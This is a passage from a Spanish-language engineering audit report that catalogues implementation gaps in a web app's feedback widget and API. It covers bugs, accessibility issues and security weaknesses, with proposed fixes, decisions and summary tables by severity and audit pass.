import { REPORT_TYPE_IDS } from '../schemas/feedback.schema.js';
type: prefillData?.type ?? REPORT_TYPE_IDS[0],
```

**Recomendacion:** Solucionar directo. Fix de una linea.

**Decision:** ✅ HACER. Usar REPORT_TYPE_IDS[0] en vez de 'bug-js' hardcodeado. (2026-03-09)

---

### GAP-031-83: FeedbackFAB wrapper div con position: relative inconsistente entre render paths [Audit #6]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Code quality / Layout bug potencial

**Descripcion:**
En `packages/feedback/src/components/FeedbackFAB.tsx:488-524`, el estado expandido renderiza un `<div style={{ position: 'relative', display: 'inline-block' }}>` como wrapper. Este div participa del document flow normal y puede afectar el layout del padre, aunque el boton FAB interno usa `position: fixed`.

El estado minimizado (lineas 447-478) renderiza el boton directamente SIN wrapper, creando una inconsistencia estructural entre los dos render paths. El boton de minimizar esta posicionado `absolute` relativo al wrapper div, lo cual es correcto, pero el propio wrapper ocupa espacio en el flow.

Ademas, es el unico patron en el codebase donde un overlay fijo se monta dentro de un div en-flow. El resto del proyecto usa portals (`ReactDOM.createPortal`) para este tipo de componentes.

**Solucion propuesta:**
1. Usar `ReactDOM.createPortal(fabContent, document.body)` para renderizar el FAB en el body directamente
2. O hacer el wrapper `position: fixed` para que no afecte el layout del padre

**Recomendacion:** Postergar. Bajo impacto visual en practica.

**Decision:** ✅ HACER. Usar ReactDOM.createPortal para renderizar FAB en body directamente. (2026-03-09)

---

### GAP-031-84: Limites de sanitizeString no coinciden con limites de Zod schema [Audit #6]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Correctness / Inconsistencia de validacion

**Descripcion:**
En `apps/api/src/routes/feedback/submit.ts`, los limites pasados a `sanitizeString` no coinciden con los `.max()` del schema Zod local:

| Campo | Zod `.max()` | `sanitizeString` maxLength |
|-------|-------------|---------------------------|
| `stepsToReproduce` | 3000 | 5000 |
| `expectedResult` | 1000 | 2000 |
| `actualResult` | 1000 | 2000 |
| `title` | 200 | undefined (default) |
| `description` | 5000 | 5000 (OK) |

Dado que Zod ya valida antes de `sanitizeString`, los valores mayores al limite de Zod ya fueron rechazados, por lo que la discrepancia es **inofensiva en la practica**. Sin embargo, si alguien cambia el limite de Zod sin actualizar `sanitizeString` (o viceversa), se crea una brecha silenciosa.

**Solucion propuesta:**
Definir constantes compartidas para los limites:
```typescript
const FIELD_LIMITS = {
    title: 200,
    description: 5000,
    stepsToReproduce: 3000,
    expectedResult: 1000,
    actualResult: 1000,
} as const;
```
Y usarlas tanto en Zod como en sanitizeString.

**Recomendacion:** Solucionar directo. Fix trivial de DRY.

**Decision:** ✅ HACER. Crear constantes FIELD_LIMITS compartidas entre Zod y sanitizeString. (2026-03-09)

---

### GAP-031-85: FeedbackFAB en admin app no esta wrapeado por error boundary [Audit #6]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 1
**Categoria:** Resiliencia / Arquitectura

**Descripcion:**
En `apps/admin/src/routes/__root.tsx`, el `FeedbackFAB` esta renderizado **fuera** del `FeedbackErrorBoundary` (lineas 162-168 vs 147-156). Si el propio FAB crashea durante el render (e.g., crash en `FeedbackModal`, error en `useKeyboardShortcut`, o crash en `useAutoCollect`), ese error burbujea al `GlobalErrorBoundary` del admin pero **no** al `FeedbackErrorBoundary`.

Esto crea una paradoja: el mecanismo de reporte de errores puede fallar sin ofrecer al usuario la posibilidad de reportar ESE error via el mismo sistema.

En contraste, en el web app (`BaseLayout.astro`), los islands de Astro aislan naturalmente los crashes del FAB del resto de la pagina.

**Solucion propuesta:**
Wrapear el FAB en su propio error boundary minimo:
```tsx
<FeedbackErrorBoundary
    apiUrl={env.VITE_API_URL}
    appSource="admin"
    feedbackPageUrl={feedbackUrl}
>
    <FeedbackFAB
        apiUrl={env.VITE_API_URL}
        appSource="admin"
        ...
    />
</FeedbackErrorBoundary>
```

Alternativa mas simple: envolver en un `try`/`catch` boundary custom que simplemente renderiza `null` si el FAB falla, preservando la app principal.

**Recomendacion:** Solucionar directo. Fix trivial. Es importante que el sistema de reporte no sea un punto unico de fallo.

**Decision:** ✅ HACER. Wrapear FeedbackFAB en admin con FeedbackErrorBoundary. (2026-03-09)

---

### GAP-031-86: initializationFailed en notification-helper.ts silencia permanentemente todas las notificaciones [Audit #6]

**Severidad:** ALTA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Bug / Correctness / Resiliencia del fallback

**Descripcion:**
En `apps/api/src/utils/notification-helper.ts:27-28`:

```typescript
let notificationServiceInstance: NotificationService | null = null;
let initializationFailed = false;
```

Si la primera llamada a `getNotificationService()` falla (e.g., `HOSPEDA_RESEND_API_KEY` no disponible, error de red, error transitorio en Resend SDK), `initializationFailed` se setea a `true` y NUNCA se resetea. Todas las llamadas futuras a `sendNotification()` silenciosamente retornan sin enviar nada.

En el contexto del feedback system, esto es especialmente grave: si el email de fallback (cuando Linear falla) no se puede enviar porque `initializationFailed=true` de un error previo no-relacionado, los reportes de feedback se pierden SILENCIOSAMENTE. Ni Linear los tiene, ni el equipo recibe email.

**Impacto:** Perdida silenciosa e irreversible (hasta restart) de la capacidad de enviar emails de fallback de feedback. Combinado con GAP-031-31 (email al destinatario incorrecto), crea un doble punto de fallo en el canal de fallback.

**Solucion propuesta:**
1. Agregar reintentos con backoff: en vez de flag permanente, intentar re-inicializar despues de un cooldown
2. O al menos loguear un warning en cada intento de envio que se descarta, para que no sea silencioso
3. La solucion minima:
```typescript
async function getNotificationService(): Promise<NotificationService | null> {
    if (notificationServiceInstance) return notificationServiceInstance;
    try {
        notificationServiceInstance = await NotificationService.create({ ... });
        return notificationServiceInstance;
    } catch (error) {
        logger.error({ error }, 'Failed to initialize NotificationService (will retry on next call)');
        return null; // NO setear flag permanente
    }
}
```

**Recomendacion:** Solucionar directo. El flag permanente es un anti-pattern que debe eliminarse. No requiere spec.

**Decision:** ✅ HACER. Eliminar flag initializationFailed permanente, reintentar en cada llamada. (2026-03-09)

---

### GAP-031-87: apiUrl prop en useFeedbackSubmit acepta string arbitrario sin validacion de origen [Audit #6]

**Severidad:** ALTA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Seguridad / Data exfiltration

**Descripcion:**
En `packages/feedback/src/hooks/useFeedbackSubmit.ts:97`:

```typescript
const response = await fetch(`${apiUrl}/api/v1/public/feedback`, {
    method: 'POST',
    body: formData
});
```

`apiUrl` es un prop string que se pasa directamente a `fetch`. No hay validacion de protocolo ni de origen. Si un consumidor (app) pasa un valor derivado de env vars sin validar (o si un atacante modifica el DOM para cambiar un data attribute), el formulario de feedback envia datos del usuario (email, nombre, userId, browser info, console errors, screenshots) a un servidor controlado por el atacante.

A diferencia de GAP-031-48 (SSRF server-side), este es un vector **client-side** que exfiltra datos del navegador del usuario.

**Solucion propuesta:**
Validar `apiUrl` al inicializar el hook:
```typescript
function validateApiUrl(url: string): void {
    try {
        const parsed = new URL(url);
        if (!['http:', 'https:'].includes(parsed.protocol)) {
            throw new Error(`apiUrl must use http or https, got: ${parsed.protocol}`);
        }
    } catch (e) {
        throw new Error(`Invalid apiUrl: ${url}`);
    }
}
```

Para mayor seguridad, validar contra una lista de origenes permitidos (e.g., `*.hospeda.com`, `localhost`).

**Recomendacion:** Solucionar directo. Fix de seguridad estandar.

**Decision:** ✅ HACER. Validar protocolo y origen de apiUrl en useFeedbackSubmit. (2026-03-09)

---

### GAP-031-88: FeedbackReportEmail renderiza attachment URLs como texto plano [Audit #6]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** UX / Funcionalidad incompleta

**Descripcion:**
En `packages/notifications/src/templates/feedback/FeedbackReportEmail.tsx:220-228`:

```tsx
{attachmentUrls.map((url, index) => (
    <Text key={url} style={styles.fieldValue}>
        {index + 1}. {url}
    </Text>
))}
```

Las URLs de attachments se muestran como texto plano. El equipo que recibe el email de fallback debe copiar/pegar las URLs manualmente para ver los adjuntos. Dado que el email es para el equipo tecnico, links clickeables mejorarian significativamente la experiencia.

**Nota:** Este gap es parcialmente redundante con GAP-031-33 (attachments perdidos en fallback) ya que si no se suben a Linear, no hay URLs que mostrar. Pero si Linear sube los archivos exitosamente y luego falla al crear el issue, los attachment URLs podrian existir.

**Solucion propuesta:**
```tsx
{attachmentUrls.map((url, index) => (
    <Link key={url} href={url} style={styles.link}>
        Adjunto {index + 1}
    </Link>
))}
```

**Recomendacion:** Solucionar directo. Fix trivial.

**Decision:** ✅ HACER. Renderizar attachment URLs como links clickeables en email (junto con GAP-031-33). (2026-03-09)

---

### GAP-031-89: Feedback API routes no siguen el patron de directorio del proyecto [Audit #6]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 2
**Categoria:** Consistencia / Arquitectura

**Descripcion:**
La guia del proyecto especifica la estructura de rutas como:
```
routes/<entity>/
  index.ts           # Re-exports only
  public/index.ts    # Public endpoints
  protected/index.ts # Protected endpoints
  admin/index.ts     # Admin endpoints
```

La implementacion de feedback tiene:
```
routes/feedback/
  index.ts   # Contiene logica de enrutamiento directamente
  submit.ts  # Handler del endpoint
```

No sigue la estructura `public/` como subdirectorio. El `index.ts` contiene logica en lugar de ser un barrel file. Si en el futuro se agregan endpoints protegidos (e.g., `GET /admin/feedback` para listar submissions), la estructura actual no escala.

**Solucion propuesta:**
Reestructurar a:
```
routes/feedback/
  index.ts           # Re-export de public/
  public/
    index.ts         # Routes
    submit.ts        # Handler
```

**Recomendacion:** Postergar. Inconsistencia menor que no afecta funcionalidad.

**Decision:** ✅ HACER. Reestructurar routes/feedback a patrón public/ con barrel file. (2026-03-09)

---

### GAP-031-90: UseKeyboardShortcutInput interface no exportada [Audit #6]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Code quality / API pública inconsistente

**Descripcion:**
En `packages/feedback/src/hooks/useKeyboardShortcut.ts:12`, la interface `UseKeyboardShortcutInput` esta definida pero no exportada. Todos los demas hooks del paquete (`useFeedbackSubmit`, `useAutoCollect`, `useConsoleCapture`) exportan sus tipos de input. Esto impide que consumidores tipen explicitamente los props al usar el hook.

**Solucion propuesta:**
Agregar `export` a la interface:
```typescript
export interface UseKeyboardShortcutInput { ... }
```

Y exportar desde `index.ts`.

**Recomendacion:** Solucionar directo. Fix de una palabra.

**Decision:** ✅ HACER. Exportar UseKeyboardShortcutInput interface. (2026-03-09)

---

## Resumen de Gaps por Severidad

| Severidad | Cantidad | IDs |
|-----------|----------|-----|
| CRITICA | 7 | GAP-031-12, 16, 31, 37, 48, 49, 50 |
| ALTA | 21 | GAP-031-15, 18, 19, 21, 26, 33, 38, 51, 52, 53, 54, 56, 57, 58, 60, 61, 65, **79, 85, 86, 87** |
| MEDIA | 28 | GAP-031-01, 04, 07, 17, 20, 22, 23, 24, 27, 28, 32, 34, 39, 40, 41, 46, 55, 59, 62, 63, 64, 66, 67, 68, 69, 70, 71, 72, 73, **84** |
| BAJA | 33 | GAP-031-02, 03, 05, 06, 08, 09, 13, 14, 25, 29, 30, 35, 36, 42, 43, 44, 45, 47, 74, 75, 76, 77, 78, **80, 81, 82, 83, 88, 89, 90** |
| MUY BAJA | 1 | GAP-031-11 |
| **TOTAL** | **90** | |

## Resumen por Categoria

| Categoria | Gaps |
|-----------|------|
| Seguridad | GAP-031-09, 17, 18, 20, 21, 22, 24, 26, 38, 41, 48, 52, 53, 54, 55, 64, **87** |
| Bug/Correctness | GAP-031-16, 23, 25, 28, 31, 37, 45, 51, 57, 60, 61, 62, 70, 77, **84, 86** |
| Accesibilidad/UX | GAP-031-27, 40, 58, 59, 67, 68, 69, 74, **79** |
| DoS/Resource exhaustion | GAP-031-49, 50 |
| Operabilidad/Config | GAP-031-07, 12, 13, 19, 35, 66 |
| Code quality/DRY | GAP-031-01, 08, 15, 36, 43, 44, 75, 76, **80, 81, 82, 90** |
| Funcionalidad incompleta | GAP-031-04, 05, 06, 32, 33, 56, 63, 73, **88** |
| Build/API rota | GAP-031-65, 66 |
| Resiliencia | GAP-031-71, 72, **85** |
| Desviacion de spec | GAP-031-02, 03, 39 |
| Arquitectura/Layout | **GAP-031-83, 89** |
| i18n | GAP-031-14, 29 |
| Performance | GAP-031-30, 34 |
| Documentacion | GAP-031-10, 11 |
| Testing | GAP-031-42, 46, 47 |
| Notificaciones | GAP-031-78 |

## Resumen por Audit Pass

| Audit | Gaps encontrados | Criticos | Altos |
|-------|-----------------|----------|-------|
| Audit #1 | 15 | 1 (GAP-12) | 1 (GAP-15) |
| Audit #2 | 15 | 1 (GAP-16) | 4 (GAP-18,19,21,26) |
| Audit #3 | 6 | 1 (GAP-31) | 1 (GAP-33) |
| Audit #4 | 11 | 1 (GAP-37) | 1 (GAP-38) |
| Audit #5 | 31 | 3 (GAP-48,49,50) | 11 (GAP-51-58,60,61,65) |
| **Audit #6** | **12** | **0** | **4 (GAP-79,85,86,87)** |
| **Total** | **90** | **7** | **21** |

---

## Recomendaciones

### Solucionar Directo INMEDIATAMENTE (critico/blocker)

| Gap | Descripcion | Complejidad | Esfuerzo | Audit |
|-----|-------------|-------------|----------|-------|
| **GAP-031-49** | **No hay body size limit antes de formData() parse (DoS)** | **1** | **5 min** | **#5** |
| **GAP-031-31** | **Email fallback envia al reporter (el equipo NUNCA recibe el reporte)** | **1** | **2 min** | #3 |
| **GAP-031-37** | **Hooks condicionales en FeedbackFAB (Rules of Hooks violation)** | **1** | **10 min** | #4 |
| **GAP-031-48** | **SSRF via presigned URL de Linear no validada** | **1** | **10 min** | **#5** |
| **GAP-031-50** | **Buffers de archivos (50MB) retenidos en memoria simultaneamente** | **2** | **30 min** | **#5** |
| GAP-031-16 | setState durante render (infinite loop) | 1 | 5 min | #2 |
| GAP-031-18 | reporterEmail no sanitizado (XSS) | 1 | 2 min | #2 |
| GAP-031-26 | Attachments procesados sin validar conteo (DoS) | 1 | 5 min | #2 |
| GAP-031-27 | aria-hidden oculta modal de screen readers | 1 | 2 min | #2 |
| GAP-031-12 | Configurar Linear IDs reales | 1 | 30 min manual | #1 |

### Solucionar Directo PRONTO (alta prioridad)

| Gap | Descripcion | Complejidad | Esfuerzo | Audit |
|-----|-------------|-------------|----------|-------|
| **GAP-031-79** | **outline:none elimina indicador de foco, WCAG 2.4.7 failure** | **2** | **30 min** | **#6** |
| **GAP-031-85** | **FeedbackFAB en admin sin error boundary propio** | **1** | **10 min** | **#6** |
| **GAP-031-86** | **initializationFailed silencia notificaciones permanentemente** | **1** | **15 min** | **#6** |
| **GAP-031-87** | **apiUrl sin validacion de origen (data exfiltration)** | **1** | **10 min** | **#6** |
| **GAP-031-57** | **Admin feedbackPageUrl apunta al dominio incorrecto** | **1** | **5 min** | #5 |
| **GAP-031-56** | **Web FAB no pasa datos del usuario autenticado** | **1** | **5 min** | #5 |
| **GAP-031-60** | **useFeedbackSubmit sin AbortController (setState en unmounted)** | **2** | **30 min** | #5 |
| **GAP-031-65** | **Export ./schemas/server apunta a archivo inexistente** | **1** | **15 min** | #5 |
| **GAP-031-52** | **Campo data JSON sin limite de tamano antes de JSON.parse** | **1** | **5 min** | #5 |
| **GAP-031-53** | **consoleErrors array sin limites en schema servidor** | **1** | **2 min** | #5 |
| **GAP-031-54** | **errorInfo.stack puede escapar code fence Markdown** | **1** | **5 min** | #5 |
| **GAP-031-51** | **withRetry reintenta errores no-retriable (4xx)** | **2** | **30 min** | #5 |
| **GAP-031-64** | **window.location.href expone OAuth tokens** | **1** | **5 min** | #5 |
| **GAP-031-61** | **useAutoCollect no actualiza cuando props cambian** | **1** | **10 min** | #5 |
| **GAP-031-38** | **Markdown injection en Linear issues (phishing, tracking)** | **2** | **1 hora** | #4 |
| **GAP-031-33** | **Attachments perdidos en email fallback** | **2** | **1-2 horas** | #3 |
| GAP-031-19 | Feature flag FEEDBACK_ENABLED non-functional | 2 | 30 min | #2 |
| GAP-031-21 | Validacion MIME sin magic bytes | 2 | 1 hora | #2 |
| GAP-031-15 | Schema Zod duplicado (Zod v3 vs v4) | 3 | 2-4 horas | #1 |
| GAP-031-07 | Env vars no registradas ni funcionales | 2 | 30 min | #1 |
| GAP-031-04 | Console capture no inicializa al arranque | 3 | 1-2 horas | #1 |
| GAP-031-23 | setTimeout leak en pulse | 1 | 5 min | #2 |
| GAP-031-28 | sanitizeString destruye multilinea | 2 | 30 min | #2 |
| GAP-031-41 | Environment fields no sanitizados (complemento de 38) | 2 | 30 min | #4 |

### Solucionar Directo (media/baja prioridad)

| Gap | Descripcion | Complejidad | Audit |
|-----|-------------|-------------|-------|
| **GAP-031-58** | **Tooltip FAB duplica anuncio en screen readers** | **1** | **#5** |
| **GAP-031-67** | **Mobile drawer sin boton de cierre visible** | **1** | **#5** |
| **GAP-031-69** | **accept="image/*" permite tipos rechazados** | **1** | **#5** |
| **GAP-031-73** | **429 status no manejado en cliente (string rate limit nunca se muestra)** | **1** | **#5** |
| **GAP-031-63** | **Keyboard shortcut se dispara dentro de inputs de texto** | **1** | **#5** |
| **GAP-031-70** | **setState en catch de render() en ErrorBoundary** | **1** | **#5** |
| **GAP-031-71** | **Standalone page sin ErrorBoundary** | **1** | **#5** |
| **GAP-031-62** | **useConsoleCapture multi-mount corrompe restauracion** | **2** | **#5** |
| **GAP-031-59** | **Boton minimizar 18x18px viola WCAG 2.5.8** | **1** | **#5** |
| **GAP-031-55** | **Presigned URL con credenciales logueada** | **1** | **#5** |
| **GAP-031-66** | **Exports ./schemas y ./config apuntan a barrel inexistentes** | **1** | **#5** |
| GAP-031-39 | Titulo Linear usa label espanol en vez de type ID | 1 | #4 |
| GAP-031-40 | Modal no deshabilita scroll del body | 1 | #4 |
| GAP-031-46 | No existen E2E/Playwright tests reales | 4 | #4 |
| GAP-031-32 | Label "beta" nunca se aplica a issues de Linear | 1 | #3 |
| GAP-031-34 | LinearFeedbackService re-creado en cada request | 1 | #3 |
| GAP-031-36 | Severity labels hardcodeados en submit.ts | 1 | #3 |
| GAP-031-35 | HOSPEDA_LINEAR_TEAM_ID env var muerta | 1 | #3 |
| GAP-031-06 | deployVersion no se pasa | 2 | #1 |
| GAP-031-17 | appSource cast inseguro | 1 | #2 |
| GAP-031-20 | Stack trace en query params | 2 | #2 |
| GAP-031-24 | Console errors filtran datos sensibles | 3 | #2 |
| GAP-031-22 | Rate limit bypass X-Forwarded-For | 2 | #2 |
| GAP-031-01 | Archivos >500 lineas | 3 | #1 |
| GAP-031-08 | Estilos inline duplicados | 2 | #1 |
| GAP-031-13 | .env.example incompleto | 1 | #1 |
| GAP-031-14 | Rate limit mensaje ingles | 1 | #1 |
| GAP-031-25 | Buffer mutation race condition | 2 | #2 |
| GAP-031-30 | Uploads secuenciales | 1 | #2 |
| GAP-031-10 | TODOs.md desactualizado | 1 | #1 |
| GAP-031-05 | FeedbackIslandWrapper dead code | 1 | #1 |
| GAP-031-42 | Query param type no validado contra enum | 1 | #4 |
| GAP-031-44 | 3 strings hardcodeados fuera de FEEDBACK_STRINGS | 1 | #4 |
| GAP-031-45 | validateStep1 valida environment innecesariamente | 1 | #4 |
| **GAP-031-72** | **Standalone usa client:load en vez de client:only** | **1** | **#5** |
| **GAP-031-74** | **Boton "Agregar detalles" disabled sin cambio visual** | **1** | **#5** |
| **GAP-031-75** | **typeHovered state es dead code** | **1** | **#5** |
| **GAP-031-76** | **Keyboard shortcut hardcodeado en tooltip** | **1** | **#5** |
| **GAP-031-77** | **Error serializado como {} via JSON.stringify** | **1** | **#5** |
| **GAP-031-80** | **feedbackErrorInfoSchema definido pero no usado inline** | **1** | **#6** |
| **GAP-031-81** | **handleSubmit ejecuta safeParse() dos veces redundantemente** | **1** | **#6** |
| **GAP-031-82** | **Default 'bug-js' hardcodeado en vez de REPORT_TYPE_IDS[0]** | **1** | **#6** |
| **GAP-031-84** | **Limites sanitizeString no coinciden con limites Zod** | **1** | **#6** |
| **GAP-031-88** | **Attachment URLs como texto plano en email fallback** | **1** | **#6** |
| **GAP-031-90** | **UseKeyboardShortcutInput interface no exportada** | **1** | **#6** |

### Documentar como Decision de Arquitectura

| Gap | Descripcion |
|-----|-------------|
| GAP-031-02 | HTML puro en vez de shadcn (self-contained design) |
| GAP-031-03 | SVG inline en vez de @repo/icons (self-contained design) |

### Postergar (deuda tecnica post-beta)

| Gap | Descripcion | Audit |
|-----|-------------|-------|
| GAP-031-09 | Virus scanning de attachments | #1 |
| GAP-031-11 | Link a feedback desde 404 | #1 |
| GAP-031-29 | feedbackPageUrl hardcodeado a /es/ | #2 |
| GAP-031-43 | mapZodMessage con string matching fragil | #4 |
| GAP-031-47 | Tests excesivamente mockeados, baja deteccion real | #4 |
| **GAP-031-68** | **`<dialog open>` estatico omite .showModal() nativo** | **#5** |
| **GAP-031-78** | **feedback_report como TRANSACTIONAL contamina billing log** | **#5** |
| **GAP-031-83** | **FeedbackFAB wrapper div inconsistente entre render paths** | **#6** |
| **GAP-031-89** | **Feedback routes no siguen patron de directorio del proyecto** | **#6** |

---

## Estado General

El sistema de feedback esta en un **estado funcional** (~83% tasks completadas, 38/46). Seis pasadas de auditoria han revelado **90 gaps** entre la spec y la implementacion real. Cada pasada sigue encontrando issues no detectados anteriormente:

**Audit #6 (esta pasada) revelo 12 gaps nuevos:**
- **0 CRITICOS** (los 7 criticos de pasadas anteriores siguen vigentes)
- **4 ALTOS**: focus indicators WCAG eliminados (GAP-79), FeedbackFAB sin error boundary en admin (GAP-85), notificaciones silenciadas permanentemente (GAP-86), apiUrl sin validacion de origen (GAP-87)
- **1 MEDIO**: limites de sanitizacion desincronizados con Zod (GAP-84)
- **7 BAJOS**: schema inline duplicado (GAP-80), double safeParse (GAP-81), default hardcodeado (GAP-82), wrapper div inconsistente (GAP-83), attachment URLs como texto plano (GAP-88), routes sin patron de directorio (GAP-89), interface no exportada (GAP-90)

**Patrones nuevos detectados en Audit #6:**
1. **Accesibilidad de teclado** (GAP-79): `outline: 'none'` en todos los elementos interactivos sin reemplazo. Las 5 auditorias previas se enfocaron en `aria-*` y screen readers pero no detectaron la falta de indicador de foco visual para navegacion por teclado
2. **Resiliencia del sistema de reporte** (GAP-85): El FAB puede crashear sin que el error boundary lo capture, creando un punto ciego paradojico
3. **Cascada de fallos en fallback** (GAP-86): Si la inicializacion de notificaciones falla una vez, el flag `initializationFailed` silencia permanentemente el canal de email. Combinado con GAP-31 (email al destinatario incorrecto) y GAP-33 (attachments perdidos), el fallback de email tiene 3 puntos de fallo independientes
4. **Exfiltracion client-side** (GAP-87): A diferencia de GAP-48 (SSRF server-side), este vector permite redirigir datos del usuario a un servidor externo desde el navegador

**Resumen acumulativo de las 6 auditorias:**

- **7 bugs CRITICOS** que deben corregirse antes de cualquier uso en produccion
- **21 gaps ALTOS** de seguridad, funcionalidad, accesibilidad y correctness
- **28 gaps MEDIOS** de operabilidad, accesibilidad, UX y correctness
- **33 gaps BAJOS** de code quality, DRY, config, testing y layout
- **2 decisiones de arquitectura** justificadas para documentar como ADR

**Tendencia de descubrimiento:**
| Audit | Gaps | Criticos | Altos | Observacion |
|-------|------|----------|-------|-------------|
| #1 | 15 | 1 | 1 | Revision inicial de cobertura |
| #2 | 15 | 1 | 4 | Seguridad y sanitizacion |
| #3 | 6 | 1 | 1 | Bug funcional critico (email) |
| #4 | 11 | 1 | 1 | React patterns y injection |
| #5 | 31 | 3 | 11 | DoS, lifecycle, builds, data leakage |
| #6 | 12 | 0 | 4 | WCAG, resiliencia, exfiltracion |

La reduccion a 0 criticos nuevos y 12 gaps totales (vs 31 en Audit #5) indica que las auditorias estan convergiendo. Los gaps restantes son de menor severidad y mas sutiles, lo cual es esperable despues de 6 pasadas.

**Conclusion:** El sistema **NO esta listo para beta** en su estado actual. La prioridad absoluta (actualizada con Audit #6):

| # | Gap | Descripcion | Esfuerzo |
|---|-----|-------------|----------|
| 1 | GAP-031-31 | Email fallback al equipo, no al reporter | 2 min |
| 2 | GAP-031-37 | Separar FeedbackFAB en wrapper + inner (hooks) | 10 min |
| 3 | GAP-031-16 | setState en useEffect, no en render | 5 min |
| 4 | GAP-031-18 | Sanitizar reporterEmail | 2 min |
| 5 | GAP-031-26 | Validar conteo de attachments antes de procesarlos | 5 min |
| 6 | GAP-031-27 | Quitar aria-hidden del backdrop | 2 min |
| 7 | GAP-031-49 | Body size limit antes de formData() parse | 5 min |
| 8 | GAP-031-79 | Restaurar focus indicators (WCAG 2.4.7) | 30 min |
| 9 | GAP-031-85 | Wrapear FeedbackFAB en admin con error boundary | 10 min |
| 10 | GAP-031-86 | Eliminar flag initializationFailed permanente | 15 min |
| 11 | GAP-031-38 | Escape Markdown en campos del usuario | 1 hora |
| 12 | GAP-031-41 | Sanitizar campos de environment | 30 min |
| 13 | GAP-031-12 | Configurar Linear IDs reales | 30 min manual |

Con estos **13 fixes** (~3.5 horas de esfuerzo) el sistema pasa de "no apto" a "funcional para beta".

Los 8 tasks pendientes (T-039 a T-046) deben implementarse como **tests reales de Playwright** (ver GAP-031-46), no como mas tests de Vitest con mocks.

---

## Audit #7 - Gaps Nuevos (12 gaps)

**Auditor:** Tech Lead Senior - lectura directa de todo el codigo fuente
**Fecha:** 2026-03-09
**Metodo:** Lectura linea por linea de 30+ archivos source, contraste directo contra spec secciones 1-16

---

### GAP-031-91: Email fallback se envia al reporterEmail, no al equipo [Audit #7]

**Severidad:** CRITICA
**Prioridad:** CRITICA
**Complejidad:** 1
**Categoria:** Correctness / Spec violation

**Descripcion:**
En `apps/api/src/routes/feedback/submit.ts:400-403`, el payload del email fallback usa:
```typescript
recipientEmail: validated.reporterEmail,
recipientName: validated.reporterName,
```

La spec (seccion 7, punto 3) dice explicitamente: "Email sent to the configured fallback address (`FEEDBACK_CONFIG.fallbackEmail`)" que es `feedback@hospeda.com`. El email se envia al usuario que reporto el bug, NO al equipo de desarrollo. El equipo nunca recibe el reporte.

**Nota:** Esto refuerza y confirma GAP-031-31 de Audit #3 que sigue sin resolverse.

**Solucion propuesta:**
Cambiar a:
```typescript
recipientEmail: FEEDBACK_CONFIG.fallbackEmail ?? 'feedback@hospeda.com',
recipientName: 'Hospeda Feedback Team',
```

**Recomendacion:** Fix directo. Bloqueante para produccion.

---

### GAP-031-92: Web FAB no recibe datos de usuario autenticado [Audit #7]

**Severidad:** CRITICA
**Prioridad:** ALTA
**Complejidad:** 2
**Categoria:** Spec violation / Funcionalidad incompleta (US-01, US-06)

**Descripcion:**
En `apps/web/src/layouts/BaseLayout.astro:108-112`, el FeedbackFAB se renderiza sin ningun dato de sesion:
```astro
<FeedbackFAB
  client:idle
  apiUrl={getApiUrl()}
  appSource="web"
/>
```

No se pasan `userId`, `userEmail` ni `userName`. La spec (US-01, AC punto 5) dice: "if the user is logged in, email and name are pre-filled". En el admin, se pasan correctamente desde `session?.user.*` (linea 162-167 de `__root.tsx`).

Resultado: en `apps/web`, un usuario logueado siempre ve los campos email/nombre vacios y obligatorios, lo cual contradice US-06 donde solo son requeridos si no esta autenticado.

**Solucion propuesta:**
1. En `BaseLayout.astro`, acceder a `Astro.locals.user` (ya disponible via middleware de auth) y pasarlo como props al FeedbackFAB.
2. Alternativa: crear un wrapper React island que lea la sesion via `better-auth` client-side.

**Recomendacion:** Fix directo. Es una regresion funcional clara respecto a la spec.

---

### GAP-031-93: Admin feedbackPageUrl es relativa al dominio equivocado [Audit #7]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 1
**Categoria:** Spec violation / Error de integracion

**Descripcion:**
En `apps/admin/src/routes/__root.tsx:150`:
```typescript
feedbackPageUrl="/es/feedback"
```

El admin corre en `localhost:3000`. Esta URL relativa se resuelve a `localhost:3000/es/feedback`, que no existe (la pagina standalone esta en `apps/web` en `localhost:4321/es/feedback/`).

Cuando el error boundary falla al renderizar el modal inline y intenta abrir la pagina standalone via `window.open()`, abre una pagina inexistente.

**Nota:** Refuerza GAP-031-57 de Audit #5 que sigue sin resolverse.

**Solucion propuesta:**
Usar una URL absoluta del dominio web:
```typescript
feedbackPageUrl={`${env.VITE_SITE_URL ?? 'http://localhost:4321'}/es/feedback`}
```

**Recomendacion:** Fix directo. 1 minuto de cambio.

---

### GAP-031-94: "beta" label nunca se aplica a issues de Linear [Audit #7]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Spec violation / Funcionalidad incompleta

**Descripcion:**
La spec (seccion 4.3, punto "Labels") dice: "Report type label + source label + 'beta' label". El config define `LINEAR_CONFIG.labels.environment.beta` con un placeholder.

Sin embargo, en `linear.service.ts:493-511`, el metodo `collectLabels()` solo agrega:
1. Report type label
2. Source app label

Nunca agrega el label "beta". Esto significa que los issues no se distinguiran como provenientes de la fase beta en Linear.

**Nota:** Refuerza GAP-031-32 de Audit #3.

**Solucion propuesta:**
Agregar en `collectLabels()`:
```typescript
const betaLabelId = this.feedbackConfig.linear.labels.environment.beta;
if (betaLabelId && !betaLabelId.startsWith('PLACEHOLDER_')) {
    labelIds.push(betaLabelId);
}
```

**Recomendacion:** Fix directo. 3 lineas de codigo.

---

### GAP-031-95: FeedbackFAB viola Rules of Hooks con early return antes de hooks [Audit #7]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 2
**Categoria:** React correctness / Rules of Hooks violation

**Descripcion:**
En `packages/feedback/src/components/FeedbackFAB.tsx:317`:
```typescript
if (!FEEDBACK_CONFIG.enabled) return null;  // <-- early return BEFORE hooks

const [isOpen, setIsOpen] = useState<boolean>(false);  // hook called conditionally
```

El early return en linea 317 esta ANTES de todos los `useState` y `useEffect` hooks (lineas 323-420). React requiere que los hooks se llamen en el mismo orden en cada render. Si `FEEDBACK_CONFIG.enabled` cambia, el numero de hooks cambia y React crashea.

